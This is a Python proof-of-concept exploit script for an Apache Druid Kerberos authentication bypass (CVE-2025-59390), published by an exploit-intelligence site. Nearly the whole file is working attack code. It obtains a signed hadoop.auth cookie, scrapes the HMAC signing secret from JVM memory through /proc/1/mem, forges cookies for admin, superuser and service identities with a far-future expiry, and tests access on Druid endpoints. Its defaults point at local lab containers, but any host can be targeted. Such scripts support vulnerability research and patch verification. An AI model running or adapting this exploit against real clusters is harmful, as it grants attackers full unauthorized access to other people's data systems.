#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Druid Kerberos Authentication Bypass via Weak PRNG Cookie Signing
# CVE            : CVE-2025-59390
# Vendor         : Apache Software Foundation
# Product        : Apache Druid
# Affected       : <= 34.0.0
# Type           : CWE-338 - Use of Cryptographically Weak PRNG
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-11-26
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-59390 - End-to-End Kerberos Authentication Bypass

Demonstrates that Apache Druid <= 34.0.0 uses ThreadLocalRandom (a non-cryptographic PRNG)
to generate the HMAC-SHA256 cookie signing secret when cookieSignatureSecret is not explicitly
configured.

ATTACK CHAIN:
  1. Obtain valid hadoop.auth cookie via SPNEGO authentication
  2. Extract HMAC-SHA256 signing secret from JVM process memory (/proc/PID/mem)
  3. Forge hadoop.auth cookies for arbitrary users with far-future expiry
  4. Verify forged cookies bypass Kerberos authentication on all Druid endpoints

PREREQUISITES:
  - Python 3.6+ (stdlib only)
  - Network access to the Druid HTTP endpoint
  - Docker CLI access to the Druid container (for secret extraction via /proc/PID/mem)

REFERENCES:
  - CVE-2025-59390
  - https://nvd.nist.gov/vuln/detail/CVE-2025-59390
  - https://lists.apache.org/thread/jwjltllnntgj1sb9wzsjmvwm9f8rlhg8
"""

import sys
import hmac
import hashlib
import base64
import subprocess
import re
import json
import urllib.request
import urllib.error
import time

# ============================================================================
# Configuration
# ============================================================================
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8081
DEFAULT_CONTAINER = "cve-2025-59390-druid"
DEFAULT_KDC_CONTAINER = "cve-2025-59390-kdc"
KRB_USER = "testuser@EXAMPLE.COM"
KRB_PASSWORD = "testpassword"

# Forged identity for authentication bypass
FORGED_USER = "admin"
FORGED_PRINCIPAL = "admin@EXAMPLE.COM"
FORGED_EXPIRY = 9999999999999  # Far future (year 2286)

# Druid endpoints to test
ENDPOINTS = [
    "/status",
    "/druid/coordinator/v1/config",
    "/druid/coordinator/v1/servers",
    "/druid/coordinator/v1/metadata/datasources",
]


def banner():
    print("=" * 72)
    print("  CVE-2025-59390: Apache Druid Kerberos Authentication Bypass")
    print("  Weak PRNG (ThreadLocalRandom) Cookie Signing Secret")
    print("  Affected: Apache Druid <= 34.0.0 with druid-kerberos extension")
    print("=" * 72)
    print()


# ============================================================================
# Step 1: Obtain a valid signed cookie via SPNEGO
# ============================================================================
def obtain_cookie_via_spnego(druid_host, druid_port, kdc_container, druid_container):
    """
    Authenticate via Kerberos SPNEGO to obtain a valid hadoop.auth cookie.
    Runs kinit + curl --negotiate inside the KDC container.
    """
    print("[*] Step 1: Obtaining valid hadoop.auth cookie via SPNEGO authentication")
    print(f"    KDC container: {kdc_container}")
    print(f"    Target: http://{druid_container}:{druid_port}/status")

    cmd = [
        "docker", "exec", kdc_container, "bash", "-c",
        f'echo "{KRB_PASSWORD}" | kinit {KRB_USER} 2>/dev/null && '
        f'curl -s -D /dev/stderr --negotiate -u: http://{druid_container}:{druid_port}/status 2>&1'
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        print("    [-] SPNEGO authentication timed out")
        return None, None
    except FileNotFoundError:
        print("    [-] Docker CLI not found. Cannot obtain cookie via SPNEGO.")
        return None, None

    # Extract Set-Cookie header
    cookie_match = re.search(r'Set-Cookie:\s*hadoop\.auth="([^"]+)"', output)
    if not cookie_match:
        print("    [-] Failed to extract hadoop.auth cookie from SPNEGO response")
        print(f"    [-] Output: {output[:500]}")
        return None, None

    cookie_value = cookie_match.group(1)
    print(f"    [+] Got cookie: hadoop.auth=\"{cookie_value[:80]}...\"")

    # Parse token string and signature
    # Cookie format: u=<user>&p=<principal>&t=<type>&e=<expiry>&s=<base64sig>
    last_s_idx = cookie_value.rfind("&s=")
    if last_s_idx == -1:
        print("    [-] Cookie does not contain &s= signature delimiter")
        return None, None

    token_string = cookie_value[:last_s_idx]
    signature = cookie_value[last_s_idx + 3:]

    print(f"    [+] Token: {token_string}")
    print(f"    [+] Signature: {signature}")
    print()

    return token_string, signature


# ============================================================================
# Step 2: Extract HMAC secret from JVM process memory
# ============================================================================
def extract_secret_from_jvm(container_name, token_string, expected_signature):
    """
    Extract the cookie signing secret from the Druid JVM's process memory.

    The secret is Long.toString(ThreadLocalRandom.current().nextLong()) — a decimal
    string representation of a Java long value (e.g., "-8471614901303401589").

    This searches /proc/1/mem (the JVM heap) for strings matching the pattern of
    decimal long values, then tests each against the known HMAC-SHA256 signature.
    """
    print("[*] Step 2: Extracting HMAC secret from JVM process memory")
    print(f"    Container: {container_name}")
    print(f"    Technique: Scanning /proc/1/mem for Java long decimal strings")

    # Read heap memory regions and extract candidate strings.
    # The Java heap in OpenJDK 17 with compressed oops typically starts at
    # 0xf0000000 (4026531840). We read this region plus additional anonymous
    # rw-p mappings to find the secret string.
    #
    # Approach: Read the main Java heap region (0xf0000000 - 0xffe00000, ~254MB)
    # using dd, then use strings to find decimal-long-looking patterns.
    # The dd skip/count are in 1MB blocks: skip=3840 (0xf0000000/1048576), count=254.
    extract_cmd = [
        "docker", "exec", container_name, "bash", "-c",
        'dd if=/proc/1/mem bs=1048576 skip=3840 count=254 2>/dev/null | '
        'strings -n 8 | grep -E "^-?[0-9]{8,20}$" | sort -u'
    ]

    try:
        result = subprocess.run(extract_cmd, capture_output=True, text=True, timeout=120)
        candidates = [line.strip() for line in result.stdout.strip().split('\n') if line.strip()]
    except subprocess.TimeoutExpired:
        print("    [-] Memory scan timed out")
        return None
    except FileNotFoundError:
        print("    [-] Docker CLI not found")
        return None

    print(f"    [+] Found {len(candidates)} candidate long values in JVM heap")

    # Test each candidate against the known HMAC-SHA256 signature
    expected_sig_bytes = base64.b64decode(expected_signature)

    for i, candidate in enumerate(candidates):
        # Validate it's a valid Java long range
        try:
            val = int(candidate)
            if val < -9223372036854775808 or val > 9223372036854775807:
                continue
        except ValueError:
            continue

        secret_bytes = candidate.encode('utf-8')
        token_bytes = token_string.encode('utf-8')
        computed_hmac = hmac.new(secret_bytes, token_bytes, hashlib.sha256).digest()

        if hmac.compare_digest(computed_hmac, expected_sig_bytes):
            print(f"    [+] SECRET FOUND after testing {i + 1} candidates!")
            print(f"    [+] Secret: {candidate}")
            print(f"    [+] This is Long.toString(ThreadLocalRandom.current().nextLong())")
            print()
            return candidate

    # Also try negated versions
    for candidate in candidates:
        try:
            val = int(candidate)
            negated = str(-val)
        except ValueError:
            continue

        secret_bytes = negated.encode('utf-8')
        token_bytes = token_string.encode('utf-8')
        computed_hmac = hmac.new(secret_bytes, token_bytes, hashlib.sha256).digest()

        if hmac.compare_digest(computed_hmac, expected_sig_bytes):
            print(f"    [+] SECRET FOUND (negated form)!")
            print(f"    [+] Secret: {negated}")
            print()
            return negated

    print("    [-] Could not find secret in JVM heap candidates")
    return None


# ============================================================================
# Step 3: Forge authentication cookies
# ============================================================================
def forge_cookie(secret, username, principal, expiry_ms):
    """
    Forge a hadoop.auth cookie with a valid HMAC-SHA256 signature.

    Cookie format: u=<user>&p=<principal>&t=kerberos&e=<expiry_ms>&s=<base64_hmac>
    Signature: HMAC-SHA256(secret.encode('utf-8'), token_string.encode('utf-8'))
    """
    token_string = f"u={username}&p={principal}&t=kerberos&e={expiry_ms}"
    secret_bytes = secret.encode('utf-8')
    token_bytes = token_string.encode('utf-8')

    sig_hmac = hmac.new(secret_bytes, token_bytes, hashlib.sha256).digest()
    sig_b64 = base64.b64encode(sig_hmac).decode('utf-8')

    cookie_value = f"{token_string}&s={sig_b64}"
    return cookie_value


def forge_cookies(secret):
    """Forge cookies for multiple identities to demonstrate full bypass."""
    print("[*] Step 3: Forging authentication cookies for arbitrary users")
    print(f"    Using recovered secret: {secret}")
    print()

    identities = [
        ("admin", "admin@EXAMPLE.COM", "Forged admin identity"),
        ("druid_system", "HTTP/druid-node@EXAMPLE.COM", "Forged service principal"),
        ("superuser", "superuser@EXAMPLE.COM", "Forged superuser identity"),
    ]

    forged = []
    for username, principal, desc in identities:
        cookie = forge_cookie(secret, username, principal, FORGED_EXPIRY)
        print(f"    [+] {desc}:")
        print(f"        Cookie: hadoop.auth=\"{cookie}\"")
        forged.append((username, principal, cookie, desc))

    print()
    return forged


# ============================================================================
# Step 4: Verify authentication bypass
# ============================================================================
def http_request(host, port, path, cookie_value=None):
    """Make an HTTP request with optional hadoop.auth cookie."""
    url = f"http://{host}:{port}{path}"
    req = urllib.request.Request(url)
    if cookie_value:
        req.add_header("Cookie", f'hadoop.auth="{cookie_value}"')

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace') if e.fp else ""
        return e.code, body
    except Exception as e:
        return None, str(e)


def verify_bypass(host, port, forged_cookies):
    """Verify that forged cookies bypass Kerberos authentication."""
    print("[*] Step 4: Verifying authentication bypass with forged cookies")
    print()

    # First verify unauthenticated access is denied
    print("    --- Baseline: Unauthenticated request ---")
    status, body = http_request(host, port, "/status")
    print(f"    GET /status (no cookie): HTTP {status}")
    if status == 401:
        print("    [+] Confirmed: Unauthenticated access returns 401 (Kerberos required)")
    print()

    # Verify invalid signature is rejected
    print("    --- Baseline: Invalid signature ---")
    bad_cookie = f"u=admin&p=admin@EXAMPLE.COM&t=kerberos&e=9999999999999&s=AAAA"
    status, body = http_request(host, port, "/status", bad_cookie)
    print(f"    GET /status (bad sig): HTTP {status}")
    if status in (401, 403):
        print("    [+] Confirmed: Invalid signature returns 401/403")
    print()

    # Test each forged cookie
    all_success = True
    for username, principal, cookie, desc in forged_cookies:
        print(f"    --- {desc}: {username} ({principal}) ---")

        for endpoint in ENDPOINTS:
            status, body = http_request(host, port, endpoint, cookie)
            status_str = f"HTTP {status}"

            if status == 200:
                # Truncate body for display
                try:
                    parsed = json.loads(body)
                    body_preview = json.dumps(parsed, indent=None)[:120]
                except (json.JSONDecodeError, ValueError):
                    body_preview = body[:120]
                print(f"    [+] GET {endpoint}: {status_str} ✓  {body_preview}...")
            else:
                print(f"    [-] GET {endpoint}: {status_str} ✗")
                all_success = False
        print()

    return all_success


# ============================================================================
# Main exploit flow
# ============================================================================
def exploit(target_host, target_port, container_name=None, kdc_container=None):
    """
    Full exploit chain:
    1. Obtain valid cookie via SPNEGO (requires KDC container)
    2. Extract HMAC secret from JVM process memory (requires Docker access)
    3. Forge cookies for arbitrary users
    4. Verify authentication bypass
    """
    banner()

    print(f"[*] Target: http://{target_host}:{target_port}")
    if container_name:
        print(f"[*] Druid container: {container_name}")
    if kdc_container:
        print(f"[*] KDC container: {kdc_container}")
    print()

    # Step 1: Get a signed cookie
    token_string = None
    signature = None

    if kdc_container and container_name:
        token_string, signature = obtain_cookie_via_spnego(
            target_host, target_port, kdc_container, container_name
        )

    if not token_string or not signature:
        print("[!] Could not obtain cookie via SPNEGO. Provide a captured cookie manually.")
        print("[!] Set TOKEN_STRING and SIGNATURE variables in the script, or use poc_vector2.py")
        return False

    # Step 2: Extract the secret from JVM memory
    secret = extract_secret_from_jvm(container_name, token_string, signature)

    if not secret:
        print("[!] Failed to extract secret from JVM memory.")
        print("[!] The secret may be in a memory region not scanned, or the heap layout differs.")
        return False

    # Step 3: Forge cookies
    forged_cookies = forge_cookies(secret)

    # Step 4: Verify bypass
    success = verify_bypass(target_host, target_port, forged_cookies)

    # Summary
    print("=" * 72)
    if success:
        print("[+] EXPLOIT SUCCESSFUL — Authentication bypass confirmed!")
        print(f"[+] Recovered secret: {secret}")
        print(f"[+] Secret type: Long.toString(ThreadLocalRandom.current().nextLong())")
        print(f"[+] Cookie signing algorithm: HMAC-SHA256")
        print(f"[+] Forged cookies grant access to all Druid endpoints as any user")
        print()
        print("[+] Impact: Complete Kerberos authentication bypass.")
        print("    An attacker with access to JVM process memory (or who can brute-force")
        print("    the ThreadLocalRandom seed) can forge hadoop.auth cookies for ANY user,")
        print("    gaining full access to the Apache Druid cluster.")
    else:
        print("[-] EXPLOIT PARTIALLY SUCCESSFUL — Some endpoints returned non-200")
        print("    The cookie forgery worked but some endpoints may have additional checks.")
    print("=" * 72)

    return success


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTAINER
    kdc = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_KDC_CONTAINER

    success = exploit(host, port, container, kdc)
    sys.exit(0 if success else 1)
